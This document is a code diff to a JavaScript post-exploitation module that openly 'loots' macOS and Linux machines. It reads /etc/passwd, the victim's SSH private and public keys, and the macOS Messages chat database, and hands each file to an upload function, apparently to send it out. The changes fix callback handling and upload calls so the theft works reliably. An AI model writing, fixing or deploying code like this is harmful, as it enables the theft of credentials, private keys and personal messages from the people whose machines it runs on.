@@ -17,8 +17,13 @@ define(["utils", "filesystem", "platform"], function(utils, fs, platform) {
             if (os === 'macos') {
                 console.log('Looting MacOS system');
                 this.fs.getHomeDirectory({
-                    success: _this.lootMacOS,
-                    failure: _this.lootMacOS
+                    success: function(home) {
+                        _this.lootMacOS.call(_this, home);
+                    },
+                    failure: function() {
+                        console.log('Warning: Could not determine home directory');
+                        _this.lootMacOS.call(_this, null);
+                    }
                 });
             } else if (os === 'linux') {
                 this.lootLinux();
@@ -49,7 +54,7 @@ define(["utils", "filesystem", "platform"], function(utils, fs, platform) {
             var _this = this;
             this.fs.getFile('/etc/passwd', {
                 success: function(data) {
-                    _this.uploadFile('passwd', data);
+                    _this.utils.uploadFile('passwd', data, {});
                 }
             });
         },
@@ -62,13 +67,13 @@ define(["utils", "filesystem", "platform"], function(utils, fs, platform) {
             
             this.fs.getFile(home + '/.ssh/id_rsa', {
                 success: function(data) {
-                    _this.utils.uploadFile('id_rsa', data);
+                    _this.utils.uploadFile('id_rsa', data, {});
                 }
             });
 
             this.fs.getFile(home + '/.ssh/id_rsa.pub', {
                 success: function(data) {
-                    _this.utils.uploadFile('id_rsa.pub', data);
+                    _this.utils.uploadFile('id_rsa.pub', data, {});
                 }
             });
         },
@@ -81,7 +86,7 @@ define(["utils", "filesystem", "platform"], function(utils, fs, platform) {
             var _this = this;
             this.fs.getFile(home + '/Library/Messages/chat.db', {
                 success: function(data) {
-                    _this.utils.uploadFile('chat.db', data);
+                    _this.utils.uploadFile('chat.db', data, {});
                 }
             });
         },
